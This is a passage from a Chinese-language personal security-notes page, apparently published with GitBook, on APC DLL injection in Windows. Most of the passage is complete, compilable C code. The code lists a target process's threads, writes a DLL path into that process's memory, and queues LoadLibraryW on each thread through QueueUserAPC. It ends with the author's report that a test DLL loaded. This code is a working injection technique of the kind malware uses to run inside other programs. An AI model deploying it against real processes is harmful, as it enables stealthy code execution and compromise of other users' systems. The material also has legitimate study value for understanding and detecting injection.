+<p>&#x56E0;&#x4E3A;&#x662F;&#x8981;&#x901A;&#x8FC7;APC&#x5411;&#x7EBF;&#x7A0B;&#x4E2D;&#x63D2;&#x5165;&#x51FD;&#x6570;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x83B7;&#x5F97;&#x8FDB;&#x7A0B;&#x4E2D;&#x7684;&#x7EBF;&#x7A0B;&#xFF0C;&#x7ED9;&#x6BCF;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x90FD;&#x63D2;&#x5165;&#x4E00;&#x4E0B;&#xFF0C;&#x5931;&#x8D25;&#x4E86;&#x5C31;&#x7EE7;&#x7EED;&#x4E0B;&#x4E00;&#x4E2A;&#xFF0C;&#x6BD4;&#x76F4;&#x63A5;&#x5B9A;&#x4F4D;&#x8981;&#x65B9;&#x4FBF;&#x4E00;&#x4E9B;&#x3002;</p>
+<p>&#x83B7;&#x53D6;&#x6240;&#x6709;&#x7EBF;&#x7A0B;&#xFF1A;</p>
+<pre><code class="lang-c">BOOL GetProcessThreadList(DWORD th32ProcessID, DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)
+{
+    // &#x7533;&#x8BF7;&#x7A7A;&#x95F4;
+    DWORD dwThreadIdListLength = 0;
+    DWORD dwThreadIdListMaxCount = 2000;
+    LPDWORD pThreadIdList = NULL;
+    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
+
+    pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (pThreadIdList == NULL)
+    {
+        return FALSE;
+    }
+
+    RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD));
+
+    THREADENTRY32 th32 = { 0 };
+
+    // &#x62CD;&#x6444;&#x5FEB;&#x7167;
+    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, th32ProcessID);
+
+    if (hThreadSnap == INVALID_HANDLE_VALUE)
+    {
+        return FALSE;
+    }
+
+    // &#x7ED3;&#x6784;&#x7684;&#x5927;&#x5C0F;
+    th32.dwSize = sizeof(THREADENTRY32);
+
+    //&#x904D;&#x5386;&#x6240;&#x6709;THREADENTRY32&#x7ED3;&#x6784;, &#x6309;&#x987A;&#x5E8F;&#x586B;&#x5165;&#x6570;&#x7EC4;
+
+    BOOL bRet = Thread32First(hThreadSnap, &amp;th32);
+    while (bRet)
+    {
+        if (th32.th32OwnerProcessID == th32ProcessID)
+        {
+            if (dwThreadIdListLength &gt;= dwThreadIdListMaxCount)
+            {
+                break;
+            }
+            pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;
+        }
+        bRet = Thread32Next(hThreadSnap, &amp;th32);
+    }
+
+    *pThreadIdListLength = dwThreadIdListLength;
+    *ppThreadIdList = pThreadIdList;
+
+    return TRUE;
+}
+</code></pre>
+<p>&#x6CE8;&#x5165;&#x8FC7;&#x7A0B;</p>
+<pre><code class="lang-c">#include&lt;Windows.h&gt;
+#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;tchar.h&gt;
+#include &lt;TlHelp32.h&gt;
+
+
+/*
+* &#x6CE8;&#x610F;loadlibrary&#x7684;&#x53C2;&#x6570;&#x6A21;&#x5F0F;&#x548C;&#x53C2;&#x6570;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;char&#x8FD8;&#x662F;unicode
+* &#x4E3B;&#x8981;dll&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x4E0D;&#x80FD;&#x7528;&#x4E2D;&#x6587;&#xFF0C;&#x540C;&#x76EE;&#x5F55;&#x4E5F;&#x8981;&#x7528;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84;
+*/
+
+#define notePID 23472
+
+LPCWSTR dllpath = L&quot;C:\\Users\\rootkit\\Desktop\\messageboxDll.dll&quot;;
+
+
+//&#x5217;&#x51FA;&#x6307;&#x5B9A;&#x8FDB;&#x7A0B;&#x7684;&#x6240;&#x6709;&#x7EBF;&#x7A0B;, 
+BOOL GetProcessThreadList(DWORD** ppThreadIdList, LPDWORD pThreadIdListLength)
+{
+    // &#x7533;&#x8BF7;&#x7A7A;&#x95F4;
+    DWORD dwThreadIdListLength = 0;
+    DWORD dwThreadIdListMaxCount = 2000;
+    LPDWORD pThreadIdList = NULL;
+    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
+
+    pThreadIdList = (LPDWORD)VirtualAlloc(NULL, dwThreadIdListMaxCount * sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (pThreadIdList == NULL)
+    {
+        return FALSE;
+    }
+
+    RtlZeroMemory(pThreadIdList, dwThreadIdListMaxCount * sizeof(DWORD));
+
+    THREADENTRY32 th32 = { 0 };
+
+    // &#x62CD;&#x6444;&#x5FEB;&#x7167;, &#x901A;&#x8FC7;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5FEB;&#x7167;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x7EBF;&#x7A0B;&#xFF0C;&#x6307;&#x5B9A;&#x8FDB;&#x7A0B;&#x7684;&#x5FEB;&#x7167;
+    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, notePID);
+
+    if (hThreadSnap == INVALID_HANDLE_VALUE)
+    {
+        return FALSE;
+    }
+
+    // &#x7ED3;&#x6784;&#x7684;&#x5927;&#x5C0F;
+    th32.dwSize = sizeof(THREADENTRY32);
+
+    //&#x904D;&#x5386;&#x6240;&#x6709;THREADENTRY32&#x7ED3;&#x6784;, &#x6309;&#x987A;&#x5E8F;&#x586B;&#x5165;&#x6570;&#x7EC4;&#x3010;&#x6709;&#x5173;&#x7CFB;&#x7EDF;&#x5FEB;&#x7167;&#x4E2D;&#x9047;&#x5230;&#x7684;&#x4EFB;&#x4F55;&#x8FDB;&#x7A0B;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x3011;
+    //&#x51FD;&#x6570;&#x8FD4;&#x56DE;&#x7684;&#x5FEB;&#x7167;&#x7684;&#x53E5;&#x67C4; , &#x6307;&#x5411; THREADENTRY32 &#x7ED3;&#x6784;&#x7684;&#x6307;&#x9488;
+    BOOL bRet = Thread32First(hThreadSnap, &amp;th32);
+    while (bRet)
+    {
+        // &#x5148;&#x68C0;&#x67E5;&#x5F53;&#x524D;&#x7EBF;&#x7A0B;&#x662F;&#x4E0D;&#x662F;&#x6307;&#x5B9A;&#x8FDB;&#x7A0B;&#x4E0B;&#x7684;&#x7EBF;&#x7A0B;
+        if (th32.th32OwnerProcessID == notePID)     
+        {
+            if (dwThreadIdListLength &gt;= dwThreadIdListMaxCount)
+            {
+                break;
+            }
+            pThreadIdList[dwThreadIdListLength++] = th32.th32ThreadID;
+        }
+        // &#x9047;&#x5230;&#x7684;&#x4EFB;&#x4F55;&#x8FDB;&#x7A0B;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x4FE1;&#x606F;
+        bRet = Thread32Next(hThreadSnap, &amp;th32);
+    }
+
+    *pThreadIdListLength = dwThreadIdListLength;
+    *ppThreadIdList = pThreadIdList;
+
+    return TRUE;
+}
+
+
+int main()
+{
+    size_t dwsize = (_tcslen(dllpath) + 1) * sizeof(TCHAR);
+    //size_t dwsize = (strlen(dllpath) + 1); //* sizeof(TCHAR);
+
+    // &#x83B7;&#x53D6;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;&#x7684;&#x53E5;&#x67C4;&#xFF0C;&#x91C7;&#x7528;&#x6253;&#x5F00;&#x73B0;&#x6709;&#x8FDB;&#x7A0B;&#x7684;&#x5F62;&#x5F0F;
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notePID);
+
+    // &#x5728;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;&#x4E2D;&#x5F00;&#x8F9F;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x7528;&#x6765;&#x5B58;&#x653E;&#x6CE8;&#x5165;&#x7684;dll&#x7684;&#x5730;&#x5740;
+    LPVOID pRemotebuf = VirtualAllocEx(hProcess, NULL, dwsize, MEM_COMMIT, PAGE_READWRITE);
+    printf(&quot;[+] VirtualAlloc sucess addr = %p\n&quot;, pRemotebuf);
+
+    // &#x5411;&#x5F00;&#x8F9F;&#x51FA;&#x6765;&#x7684;&#x5730;&#x5740;&#x5199;&#x5165;dll&#x8DEF;&#x5F84;
+    WriteProcessMemory(hProcess, pRemotebuf, dllpath, dwsize, NULL);
+    printf(&quot;[+] WriteProcessMemory sucess write dll path to target memroy \n&quot;);
+
+    /*
+    * &#x83B7;&#x53D6;loadlibrary&#x7684;&#x5730;&#x5740;&#x3002;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;
+    * 1&#x3001;&#x76F4;&#x63A5;&#x5728;&#x672C;&#x7A0B;&#x5E8F;&#x83B7;&#x5F97;&#xFF08;&#x5728;Windows&#x4E2D;&#x5171;&#x4EAB;&#x5E93;&#x7684;&#x5730;&#x5740;&#x662F;&#x4E00;&#x5B9A;&#x7684;&#xFF09;
+    * 2&#x3001;&#x5229;&#x7528;PEB&#x8BA1;&#x7B97;&#x76EE;&#x6807;&#x7A0B;&#x5E8F;&#x7684;kerneldll&#x5730;&#x5740;&#xFF0C;&#x590D;&#x6742;&#x4F46;&#x662F;&#x9002;&#x5408;&#x8FDC;&#x7A0B;
+    */
+    HMODULE hMOD = GetModuleHandle(L&quot;kernelbase.dll&quot;);
+    //HMODULE hMOD = GetModuleHandle(L&quot;kernelbase.dll&quot;);
+    LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMOD, &quot;LoadLibraryW&quot;);
+    printf(&quot;[+] GetProcAddress sucess pthreadproc = %p\n&quot;, pThreadProc);
+
+
+    /*  &#x6267;&#x884C;dll */
+    // &#x5148;&#x83B7;&#x5F97;&#x76EE;&#x6807;&#x8FDB;&#x7A0B;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x7EBF;&#x7A0B;
+    LPDWORD pThreadIdList = NULL;
+    DWORD dwThread_ListLength = 0;
+    GetProcessThreadList(&amp;pThreadIdList, &amp;dwThread_ListLength);
+
+    // &#x904D;&#x5386;&#x7EBF;&#x7A0B;&#xFF0C;&#x5F97;&#x673A;&#x4F1A;&#x6CE8;&#x5165;APC
+    DWORD fail = 0;
+    for (int i = dwThread_ListLength - 1; i &gt;= 0; i--)
+    {
+        // &#x6253;&#x5F00;&#x7EBF;&#x7A0B;
+        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadIdList[i]);
+        if (hThread)
+        {
+            // &#x63D2;&#x5165;APC, &#x56E0;&#x4E3A;&#x6709;&#x6761;&#x4EF6;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x4E0D;&#x4E00;&#x5B9A;&#x90FD;&#x4F1A;&#x6210;&#x529F;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x8FDB;&#x884C;&#x9519;&#x8BEF;&#x51C6;&#x5907;
+            if (!QueueUserAPC((PAPCFUNC)pThreadProc, hThread, (ULONG_PTR)pRemotebuf))
+            {
+                fail++;
+            }
+            // &#x5173;&#x95ED;&#x7EBF;&#x7A0B;&#x53E5;&#x67C4;
+            CloseHandle(hThread);
+            hThread = NULL;
+        }
+    }
+    printf(&quot;Total Thread: %d\n&quot;, dwThread_ListLength);
+    printf(&quot;Total Failed: %d\n&quot;, fail);
+
+    if (fail &gt;= dwThread_ListLength)
+    {
+        printf(&quot;Apc injection is failed\n&quot;);
+    }
+
+
+    // &#x5173;&#x95ED;&#x53E5;&#x67C4;
+    CloseHandle(hProcess);
+    return 0;
+}
+</code></pre>
+<p>&#x7ED3;&#x679C;&#xFF1A;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8BE5;dll&#x5DF2;&#x7ECF;&#x6210;&#x529F;&#x52A0;&#x8F7D;&#x5230;&#x5BF9;&#x5E94;&#x8FDB;&#x7A0B;&#x7684;&#x5185;&#x5B58;&#x4E2D;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x56E0;&#x4E3A;&#x6211;&#x5199;&#x7684;dll&#x91CC;&#x6709;&#x592A;&#x591A;&#x7684;&#x5F39;&#x7A97;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x5361;&#x6B7B;&#xFF0C;&#x6240;&#x4EE5;&#x80FD;&#x4E0D;&#x80FD;&#x5F39;&#x51FA;&#x6765;&#x770B;&#x8FD0;&#x6C14;</p>
+<p><img src="dll-inject/image-20230405141124544.png" alt="image-20230405141124544"></p>
+<footer class="page-footer"><span class="copyright">&#x6CA1;&#x6709;&#x7248;&#x6743;&#xFF0C;&#x968F;&#x4FBF;&#x590D;&#x5236;&#xFF0C;&#x514D;&#x8D39;&#x7684;&#x77E5;&#x8BC6;&#x5E94;&#x8BE5;&#x5171;&#x4EAB; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x7AE0;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2023-04-05 16:31:42
+</span></footer>
+<script>console.log("plugin-popup....");document.onclick = function(e){ e.target.tagName === "IMG" && window.open(e.target.src,e.target.src)}</script><style>img{cursor:pointer}</style>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="6种常见注入方式.html" class="navigation navigation-prev " aria-label="Previous page: windows下的进程注入（6种）">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../Vulnerability_Mining.html" class="navigation navigation-next " aria-label="Next page: Vulnerability Mining">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Dll注入的3.5种方式","level":"1.8.7","depth":2,"next":{"title":"Vulnerability Mining","level":"1.9","depth":1,"path":"MyArticles/Vulnerability_Mining.md","ref":"MyArticles/Vulnerability_Mining.md","articles":[{"title":"shellcode编写-地址定位","level":"1.9.1","depth":2,"path":"MyArticles/Vulnerability_Mining/Windows通用shellcode编写.md","ref":"MyArticles/Vulnerability_Mining/Windows通用shellcode编写.md","articles":[]}]},"previous":{"title":"windows下的进程注入（6种）","level":"1.8.6","depth":2,"path":"MyArticles/CyberSec/6种常见注入方式.md","ref":"MyArticles/CyberSec/6种常见注入方式.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["back-to-top-button","chapter-fold","code","splitter","-lunr","-search","search-pro","custom-favicon","tbfed-pagefooter","popup","-sharing","sharing-plus","intopic-toc","livereload"],"pluginsConfig":{"tbfed-pagefooter":{"copyright":"没有版权，随便复制，免费的知识应该共享","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"intopic-toc":{"isCollapsed":true,"isScrollspyActive":true,"label":"In this article","maxDepth":6,"mode":"nested","selector":".markdown-section h1, .markdown-section h2, .markdown-section h3, .markdown-section h4, .markdown-section h5, .markdown-section h6","visible":true},"livereload":{},"splitter":{},"search-pro":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"popup":{},"code":{"copyButtons":true},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"favicon":"./icon/book.ico","back-to-top-button":{},"custom-favicon":{},"sharing":{"qq":true,"all":["douban","facebook","google","instapaper","linkedin","twitter","weibo","messenger","qq","qzone","viber","whatsapp"],"douban":true,"facebook":true,"weibo":true,"twitter":true,"pocket":true,"google":true,"qzone":true},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"MyArticles/CyberSec/dll-inject.md","mtime":"2023-04-05T08:31:42.080Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-04-06T14:10:44.763Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-intopic-toc/anchor.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-intopic-toc/gumshoe.polyfills.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-intopic-toc/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
